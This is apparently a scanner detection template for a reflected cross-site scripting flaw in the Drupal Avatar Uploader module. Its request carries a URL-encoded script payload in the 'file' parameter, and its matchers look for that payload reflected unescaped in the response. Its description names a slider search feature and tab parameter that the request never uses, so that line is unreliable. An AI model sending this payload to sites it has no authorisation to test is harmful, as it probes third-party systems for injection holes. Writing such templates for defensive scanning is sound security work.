id: "drupal-avatar-xss"
name: "Drupal Avatar Uploader - Cross-Site Scripting"
severity: "high"
description: "Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings."
tech:
  - "drupal"
tags:
  - "xss"
  - "drupal"
  - "edb"
  - "packetstorm"
  - "vuln"
cwe: "CWE-80"
reference: "https://www.exploit-db.com/exploits/50841"
spaExclusion: true
request:
  method: "GET"
  path: "/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
control:
  method: "GET"
  path: "/.kovo-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<div><script>alert(document.domain)</script></div>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
